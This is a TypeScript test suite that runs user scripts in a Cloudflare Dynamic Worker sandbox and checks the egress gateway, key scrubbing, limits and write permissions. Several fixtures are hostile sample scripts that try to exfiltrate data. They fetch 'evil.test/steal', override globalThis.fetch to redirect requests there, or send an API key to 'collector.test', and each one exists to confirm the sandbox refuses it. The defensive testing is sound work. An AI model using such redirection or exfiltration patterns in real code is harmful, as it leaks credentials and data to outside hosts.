/**
 * A person's script, run the way the Cloud runs it: in a Dynamic Worker from `env.LOADER`, with every `fetch` it makes
 * going through `ScriptOutbound` and back into the record's own object (`src/script.ts`).
 *
 * REAL, NOT A STUB LOADER. A stub would do if local support were missing, and it is not missing.
 * Measured with the miniflare 5.20260903.0-alpha and workerd 1.20260903.1 that wrangler 4.129.0
 * already brings: a `workerLoaders` binding loads a module from a string, `this.ctx.exports.<Entrypoint>({ props })`
 * works from inside a Durable Object's `alarm()`, and a `WorkerEntrypoint` handed in as `globalOutbound` sees every
 * `fetch` the loaded code makes. So this file runs `src/script.ts` as it ships, bundled by esbuild, in workerd, from
 * an alarm, which is where the record runs it.
 *
 * WHAT IT CANNOT SAY, AND THE DEPLOY SMOKE HAS TO. Local workerd enforces no subrequest ceiling: the probe above made
 * ten fetches under `limits: { subRequests: 5 }` and all ten went through. Whether Cloudflare counts a script's
 * fetches against the alarm's invocation, or against the RPC call each one arrives as, is a question only a deployed
 * record answers.
 *
 * THE OBJECT BELOW STANDS IN FOR `Record$` AND DOES THE ONE THING `Record$` DOES WITH A RUN: it hands `runScript` its
 * loader, its exports, its own id and a `ScriptRuns`, and answers the gateway's calls with that `ScriptRuns`. The send
 * underneath is the real `sendAction` over a `send` double, so nothing leaves the machine and the key's scrubbing is
 * the shipped one.
 *
 * SLOW BY THE STANDARDS OF THIS SUITE, a few seconds, nearly all of it workerd starting once.
 */

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = fileURLToPath(new URL('.', import.meta.url));
const fromWrangler = createRequire(createRequire(import.meta.url).resolve('wrangler/package.json'));
const esbuild = fromWrangler('esbuild') as {
  build(o: object): Promise<{ outputFiles: { text: string }[] }>;
};
const { Miniflare, convertV4MiniflareOptions } = (await import(pathToFileURL(fromWrangler.resolve('miniflare')).href)) as {
  Miniflare: new (o: object) => { dispatchFetch(url: string, init?: object): Promise<Response>; dispose(): Promise<void> };
  convertV4MiniflareOptions(o: object): object;
};

const KEY = 'sk_live_gold_5f3a9c';
const GOLD = 'https://api.gold.test';

/**
 * The record's side of a run, in an alarm. `fetch` stores what to run, sets the alarm, and waits for the alarm to
 * write its answer, so the run happens inside `alarm()` and not inside the request that asked for it.
 */
const ENTRY = `
import { DurableObject } from 'cloudflare:workers';
import { sendAction } from '@braindog/host/actions';
import { ScriptOutbound, ScriptRecord, ScriptRuns, ScriptTail, runScript } from '../src/script.ts';

export { ScriptOutbound, ScriptRecord, ScriptTail };

export class Rec extends DurableObject {
  runs = new ScriptRuns();

  async script(run, call) {
    return this.runs.answer(run, call);
  }

  async fetch(request) {
    const asked = await request.json();
    await this.ctx.storage.delete('out');
    await this.ctx.storage.put('asked', asked);
    await this.ctx.storage.setAlarm(Date.now());
    for (let i = 0; i < 400; i++) {
      await new Promise((r) => setTimeout(r, 25));
      const out = await this.ctx.storage.get('out');
      if (out) return Response.json(out);
    }
    return Response.json({ never: true });
  }

  async alarm() {
    const scripted = await this.ctx.storage.get('asked');
    const sent = [];
    const methods = [];
    const send = sendAction({
      origins: () => scripted.scripted.decl.egress,
      openKey: async (grant) => (grant.label === 'goldapi' ? '${KEY}' : null),
      send: async (url, init) => {
        sent.push(url.href);
        methods.push(init.method);
        if (url.pathname === '/slow') await new Promise((r) => setTimeout(r, 2000));
        return Response.json({ price: 4321, heard: init.headers.get('authorization') });
      },
    });
    let answer;
    try {
      answer = await runScript(
        {
          loader: this.env.LOADER,
          exports: this.ctx.exports,
          object: this.ctx.id.toString(),
          runs: this.runs,
          send: () => send,
          /* nokeys IS A TRIAL'S LOOKUP FOR A CALLER GIVEN NO KEYS (@braindog/host/script-try), which throws its sentence. */
          grant: (label) => {
            if (label === 'nokeys') throw new Error('A trial opens no key for an agent, so the fetch naming "nokeys" was not sent.');
            return label === 'goldapi' ? { id: 'grt_gold', label, opens: 'api.gold.test' } : null;
          },
          read: {
            list: async (register) => [{ register, value: 1 }],
            get: async (spoken) => ({ spoken }),
          },
          now: () => Date.UTC(2026, 8, 22, 12),
        },
        scripted,
      );
    } catch (e) {
      answer = { threw: String(e && e.message ? e.message : e) };
    }
    await this.ctx.storage.put('out', { answer, sent, methods, open: this.runs.size });
  }
}

export default {
  fetch(request, env) {
    return env.RECORD.get(env.RECORD.idFromName('one')).fetch(request);
  },
};
`;

type Answer = {
  writes?: { op: string; register?: string; fields?: Record<string, unknown> }[];
  refused?: { code: string | null; why: string };
  log?: string;
  usage?: { fetches: number; bytes: number; wall_ms: number; cpu_ms: number };
  threw?: string;
};
type Out = { answer: Answer; sent: string[]; methods: string[]; open: number; never?: true };

let mf: InstanceType<typeof Miniflare>;

before(async () => {
  const built = await esbuild.build({
    stdin: { contents: ENTRY, resolveDir: here, sourcefile: 'script.entry.js', loader: 'js' },
    bundle: true,
    write: false,
    format: 'esm',
    platform: 'neutral',
    conditions: ['workerd', 'worker', 'browser'],
    mainFields: ['module', 'main'],
    external: ['cloudflare:workers'],
    logLevel: 'silent',
  });
  mf = new Miniflare(
    convertV4MiniflareOptions({
      port: 0,
      modules: true,
      script: built.outputFiles[0]!.text,
      /* `wrangler.jsonc`'s own date and flags, because a different date is a different runtime. */
      compatibilityDate: '2026-09-01',
      compatibilityFlags: [],
      durableObjects: { RECORD: { className: 'Rec', useSQLite: true } },
      workerLoaders: { LOADER: {} },
    }),
  );
});

after(async () => {
  await mf?.dispose();
});

/**
 * One version per distinct source, as the kernel keeps it: a new source is a new declaration row and a new version.
 *
 * FOUND BY THIS FILE'S FIRST RUN. Every case here used `gold-rate` v1, and eight of eleven failed with the first case's
 * answer, because `LOADER.get` served the Worker it had cached under `<record>:gold-rate:v1` whatever source was
 * handed the second time. That is the cache doing what it is for, and it means the id must change whenever the source
 * does, which in the record it always does. Every run now loads a Worker of its own (`LOADER.load`, no id), so nothing
 * here depends on the versions any more; they are kept so each run is leased as the record would lease it.
 */
const versions = new Map<string, number>();
const versionOf = (source: string): number => {
  if (!versions.has(source)) versions.set(source, versions.size + 1);
  return versions.get(source)!;
};

/** A leased `script.run`, as `prepareScript` hands it to a host. */
const scripted = (source: string, over: Record<string, unknown> = {}) => ({
  job: { id: 'job_gold_1', kind: 'script.run', payload: '{}', leasedUntil: null },
  host: 'api.gold.test',
  scripted: {
    script: 'gold-rate',
    version: versionOf(source + JSON.stringify(over)),
    actor: `script:gold-rate@v${versionOf(source + JSON.stringify(over))}`,
    input: null,
    decl: { egress: [GOLD], keys: ['goldapi'], reads: [], writes: ['series.gold'], limits: { wall_ms: 5_000 }, source, ...over },
    record: { id: 'rec_01JZ8QK3F7R2M9V4XN6TCB5HAD', tz: 'Africa/Cairo' },
  },
});

const run = async (source: string, over: Record<string, unknown> = {}): Promise<Out> => {
  const res = await mf.dispatchFetch('http://record/', { method: 'POST', body: JSON.stringify(scripted(source, over)) });
  const out = (await res.json()) as Out;
  assert.notEqual(out.never, true, 'the alarm never wrote an answer');
  return out;
};

/** The shared fixture: a bare fetch twice, then the one way out, `ctx.fetch` with a key by label. */
const GOLD_RATE = `
export default async function run(ctx) {
  for (const url of ['https://example.com/', '${GOLD}/rate']) {
    try {
      await fetch(url);
      ctx.log('bare went to ' + url);
    } catch (e) {
      ctx.log('bare refused ' + url);
    }
  }
  const r = await ctx.fetch('${GOLD}/rate', { key: 'goldapi' });
  const { price, heard } = await r.json();
  ctx.write('series.gold', { at: ctx.now(), value: price, heard });
}`;

test('a bare fetch is refused at the gateway and ctx.fetch to the declared origin goes through sendAction with the key', async () => {
  const { answer, sent, open } = await run(GOLD_RATE);
  assert.equal(answer.threw, undefined, answer.threw);
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  /* BOTH BARE FETCHES STOPPED, INCLUDING THE ONE TO THE DECLARED ORIGIN. What lets a request out is the run it
     belongs to, not the address it names, so a bare `fetch` is refused wherever it points. */
  assert.match(answer.log ?? '', /bare refused https:\/\/example\.com\//);
  assert.match(answer.log ?? '', /bare refused https:\/\/api\.gold\.test\/rate/);
  assert.doesNotMatch(answer.log ?? '', /bare went/);
  assert.deepEqual(sent, [`${GOLD}/rate`], 'only ctx.fetch reached the send');
  assert.deepEqual(answer.writes, [
    { op: 'create', register: 'series.gold', fields: { at: '2026-09-22T12:00:00.000Z', value: 4321, heard: 'Bearer --redacted--' } },
  ]);
  assert.equal(answer.usage?.fetches, 1);
  assert.equal(open, 0, 'the run was closed when it answered');
});

test('the key never reaches the sandbox: sendAction scrubbed it from the answer before the script read it', async () => {
  const { answer } = await run(GOLD_RATE);
  assert.doesNotMatch(JSON.stringify(answer), new RegExp(KEY));
});

test('a second run of the same version gets a Worker of its own and counts only its own fetch', async () => {
  const first = await run(GOLD_RATE);
  const second = await run(GOLD_RATE);
  assert.equal(first.answer.writes?.length, 1);
  assert.equal(second.answer.writes?.length, 1);
  assert.equal(second.answer.usage?.fetches, 1, 'the second run counted its own fetch, not the first run\'s as well');
});

test('A KEY THE KEYCHAIN DOES NOT HOLD IS SAID TO THE SCRIPT AS A REFUSED FETCH, and the gateway throws nothing, so no error is logged', async () => {
  /* CALENDAR'S WAY OF ENDING QUIETLY reads these words off the error: `is not in the keychain` in `packs/calendar`. */
  const { answer, sent } = await run(
    `
export default async function run(ctx) {
  try { await ctx.fetch(null, { address: 'Calendar link' }); ctx.log('sent'); } catch (e) { ctx.log(String(e.message)); }
  ctx.write('series.gold', { value: 1 });
}`,
    { keys: ['Calendar link'] },
  );
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  assert.equal(answer.log, 'The key "Calendar link" is not in the keychain, so nothing was sent. Put the link in your keys under that name.');
  assert.equal(answer.writes?.length, 1, 'the script went on, as it chose to');
  assert.deepEqual(sent, []);
  /* AND A NO LEAVES THE GATEWAY AS AN ANSWER: thrown there, every one is an `error` line in the Worker's logs. */
  const source = readFileSync(new URL('../src/script.ts', import.meta.url), 'utf8');
  const gateway = source.slice(source.indexOf('class ScriptOutbound'), source.indexOf('class ScriptRecord'));
  assert.doesNotMatch(gateway, /throw new Error\(reply\.error\)/u);
  assert.match(gateway, /console\.info/u);
});

test('ctx.fetch to an origin outside egress refuses the whole run even when the script catches it', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('https://evil.test/steal'); } catch (e) { ctx.log('caught'); }
  ctx.write('series.gold', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED');
  assert.equal(answer.writes, undefined);
  assert.deepEqual(sent, []);
});

/**
 * AND NOTHING AFTER THE BROKEN RULE IS SENT, NOT ONLY NOTHING WRITTEN. The case above made no fetch after the one it
 * caught, so deleting the sticky check in `ScriptRuns.answer` left every case here green while a caught refusal was
 * followed by a request to the declared origin going out. The checker measured that; this case is red against it.
 */
test('a fetch after a caught refusal is refused too, and never reaches the send', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('https://evil.test/steal'); } catch (e) {}
  try { await ctx.fetch('${GOLD}/rate', { key: 'goldapi' }); } catch (e) { ctx.log('second refused'); }
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED');
  assert.deepEqual(sent, []);
});

/**
 * A USER NAME IN THE URL REFUSES THE RUN HERE AS IT DOES IN QUICKJS. workerd's `fetch` inside the loaded Worker drops
 * `me:pw@` before the request reaches `ScriptOutbound` (measured: the bare URL arrived
 * with no authorization header and was sent), so the gateway's check on `request.url` could never fire, and the same
 * script was refused on the self-host and ran clean here. Red against that: `sent` held the declared origin's URL.
 */
test('ctx.fetch with a user name or password in the URL is refused and nothing is sent, as on the self-host', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('https://me:pw@api.gold.test/rate'); } catch (e) { ctx.log('caught'); }
  ctx.write('series.gold', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED', JSON.stringify(answer));
  assert.match(answer.refused?.why ?? '', /with a user name or password in the URL/);
  assert.doesNotMatch(answer.refused?.why ?? '', /pw/, 'the refusal repeated the credentials, and a refusal is kept on the run');
  assert.equal(answer.writes, undefined);
  assert.deepEqual(sent, []);
});

/**
 * AND THE EGRESS CHECK STAYS ON THE URL THAT IS SENT. The URL the sandbox says it asked for is read for the user name
 * only, because the loaded module that stamps it runs where the script can reach it: a script can replace
 * `globalThis.fetch` before `ctx.fetch` calls it, keep the run and the stamped URL, and point the request anywhere.
 */
test('a script that swaps the global fetch cannot pass another origin off as the declared one it stamped', async () => {
  const { answer, sent } = await run(`
const real = globalThis.fetch;
globalThis.fetch = (url, init) => real('https://evil.test/steal', init);
export default async function run(ctx) {
  try { await ctx.fetch('${GOLD}/rate'); } catch (e) { ctx.log('caught'); }
  ctx.write('series.gold', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'PULL_ORIGIN_REFUSED', JSON.stringify(answer));
  assert.match(answer.refused?.why ?? '', /evil\.test, which is not in its egress/);
  assert.deepEqual(sent, []);
});

test('a key the script does not declare is FORBIDDEN and nothing is sent', async () => {
  const { answer, sent } = await run(`
export default async function run(ctx) {
  try { await ctx.fetch('${GOLD}/rate', { key: 'bank' }); } catch (e) {}
}`);
  assert.equal(answer.refused?.code, 'FORBIDDEN');
  assert.deepEqual(sent, []);
});

test('fetches past limits.fetches refuse the run as OUT_OF_BOUNDS', async () => {
  const { answer, sent } = await run(
    `
export default async function run(ctx) {
  for (let i = 0; i < 4; i++) { try { await ctx.fetch('${GOLD}/n' + i); } catch (e) {} }
}`,
    { limits: { wall_ms: 5_000, fetches: 2 } },
  );
  assert.equal(answer.refused?.code, 'OUT_OF_BOUNDS');
  assert.equal(sent.length, 2);
});

/**
 * THE METHOD THE SCRIPT WROTE IS THE METHOD SENT, AS ON THE SELF-HOST. `@braindog/host/script` passes it through as
 * written, and this host turned everything that was not a GET into a POST: a `DELETE` of a provider's row went out as a
 * POST to the same URL, which on most APIs is a create. This case was red against that mapping.
 */
test('ctx.fetch sends the method the script asked for, not a POST in its place', async () => {
  const { answer, methods } = await run(`
export default async function run(ctx) {
  for (const method of ['DELETE', 'put', 'PATCH', 'POST', 'GET']) await ctx.fetch('${GOLD}/rows/1', { method, body: method === 'GET' ? undefined : '{}' });
}`);
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  assert.deepEqual(methods, ['DELETE', 'PUT', 'PATCH', 'POST', 'GET']);
});

test('a write the Worker was handed for a register outside writes is refused on this side of the boundary', async () => {
  const { answer } = await run(`
export default async function run(ctx) {
  ctx.write('money.ledger', { value: 1 });
}`);
  assert.equal(answer.refused?.code, 'FORBIDDEN');
  assert.equal(answer.writes, undefined);
});

/**
 * AN UPDATE WITH NO VERSION IS A LAST-WRITER UPDATE HERE AS IT IS ON THE SELF-HOST. The prelude sends `NaN` for a missing
 * version, RPC keeps it, and `checkWrites` asked for a whole number, so `ctx.update(spoken, patch)` was refused as "a
 * write this host cannot read" before the kernel, which reads a version that is no number as none, ever saw it. That
 * refusal counted against the script, and the third paused it (`check:script-run-limits`). The answer crosses this
 * test as JSON, so the `NaN` handed on arrives as `null`.
 */
test('an update with no version is handed on as a last-writer update, and one with a version keeps it', async () => {
  const { answer } = await run(`
export default async function run(ctx) {
  ctx.update('GOLD-1', { value: 2 });
  ctx.update('GOLD-2', { value: 3 }, null);
  ctx.update('GOLD-3', { value: 4 }, 7);
}`);
  assert.equal(answer.refused, undefined, JSON.stringify(answer));
  assert.deepEqual(answer.writes, [
    { op: 'update', spoken: 'GOLD-1', patch: { value: 2 }, version: null },
    { op: 'update', spoken: 'GOLD-2', patch: { value: 3 }, version: null },
    { op: 'update', spoken: 'GOLD-3', patch: { value: 4 }, version: 7 },
  ]);
});

test('a script that throws is refused with code null and keeps its log', async () => {
  const { answer } = await run(`
export default async function run(ctx) {
  ctx.log('before');
  throw new Error('no rate today');
}`);
  assert.equal(answer.refused?.code, null);
  assert.match(answer.refused?.why ?? '', /no rate today/);
  assert.match(answer.log ?? '', /before/);
});

test('a source with no default export is DECLARATION_INVALID', async () => {
  const { answer } = await run('export const x = 1;');
  assert.equal(answer.refused?.code, 'DECLARATION_INVALID');
});

test('a run that outlives wall_ms is refused within it, and the run is closed behind it', async () => {
  const started = Date.now();
  const { answer, open } = await run(
    `
export default async function run(ctx) {
  await ctx.fetch('${GOLD}/slow');
  ctx.write('series.gold', { value: 2 });
}`,
    { limits: { wall_ms: 300 } },
  );
  assert.equal(answer.refused?.code, 'OUT_OF_BOUNDS');
  assert.equal(answer.writes, undefined);
  assert.ok(Date.now() - started < 2_000, 'the answer did not wait for the slow fetch');
  assert.equal(open, 0);
});

test('reads go through ScriptRecord and only for a declared register', async () => {
  const allowed = await run(
    `
export default async function run(ctx) {
  const rows = await ctx.record.list('series.gold');
  ctx.write('series.gold', { seen: rows.length });
}`,
    { reads: ['series.gold'] },
  );
  assert.deepEqual(allowed.answer.writes, [{ op: 'create', register: 'series.gold', fields: { seen: 1 } }]);

  const refused = await run(`
export default async function run(ctx) {
  try { await ctx.record.list('money.ledger'); } catch (e) {}
}`);
  assert.equal(refused.answer.refused?.code, 'FORBIDDEN');
});

/* ── the two edges where the hosts answered different codes ─────────────────────────────────────── */

test('A KEY SENT AWAY AND THEN A LATE ANSWER IS FORBIDDEN, as on the self-host: the broken rule outranks the deadline', async () => {
  const { answer, sent } = await run(
    `
export default async function run(ctx) {
  try { await ctx.fetch('https://collector.test/in', { key: 'goldapi' }); } catch (e) { ctx.log('caught'); }
  await new Promise((r) => setTimeout(r, 1500));
}`,
    { egress: [GOLD, 'https://collector.test'], limits: { wall_ms: 300 } },
  );
  assert.equal(answer.refused?.code, 'FORBIDDEN', JSON.stringify(answer));
  assert.match(answer.refused?.why ?? '', /The key "goldapi" opens api\.gold\.test/);
  assert.deepEqual(sent, []);
});

test('A DECLARATION THAT IS MALFORMED AND NAMES THE `slash` KEY IS FORBIDDEN, as on the self-host, not DECLARATION_INVALID', async () => {
  const { answer, sent } = await run(`export default async function run(ctx) { ctx.log('never'); }`, { keys: ['slash'], limits: { wall_ms: 0 } });
  assert.equal(answer.refused?.code, 'FORBIDDEN', JSON.stringify(answer));
  assert.match(answer.refused?.why ?? '', /"slash" key/);
  assert.deepEqual(sent, []);
});

test("A LOOKUP THAT THROWS, A TRIAL'S FOR A CALLER GIVEN NO KEYS, IS THE SCRIPT'S ERROR IN ITS OWN WORDS, and sends nothing", async () => {
  const { answer, sent } = await run(
    `
export default async function run(ctx) {
  try { await ctx.fetch('${GOLD}/rate', { key: 'nokeys' }); } catch (e) { ctx.log(String(e.message)); }
  ctx.write('series.gold', { value: 1 });
}`,
    { keys: ['nokeys'] },
  );
  assert.deepEqual(answer.writes, [{ op: 'create', register: 'series.gold', fields: { value: 1 } }], JSON.stringify(answer));
  assert.match(answer.log ?? '', /A trial opens no key for an agent/);
  assert.deepEqual(sent, []);
});

/**
 * `ScriptTail` IS EXPORTED FROM THE TEST'S MAIN MODULE ABOVE, next to `ScriptOutbound` and `ScriptRecord`, so
 * `LOADER.load`'s `tails` option is one this suite's Worker actually carries, and every run above already went through
 * it. This case is the one that says so directly: the platform's own tail is loaded, and the run still answers clean
 * and closes its slot, so the door `tails` opens does not leave a run waiting on a report that never lands locally.
 */
test('with ScriptTail exported, LOADER.load takes the tails option and a run still answers clean and closes its slot', async () => {
  const { answer, open } = await run(GOLD_RATE);
  assert.equal(answer.threw, undefined, answer.threw);
  assert.equal(answer.refused, undefined, JSON.stringify(answer.refused));
  assert.deepEqual(answer.writes, [
    { op: 'create', register: 'series.gold', fields: { at: '2026-09-22T12:00:00.000Z', value: 4321, heard: 'Bearer --redacted--' } },
  ]);
  assert.equal(open, 0, 'the run was closed when it answered, tail and all');
});
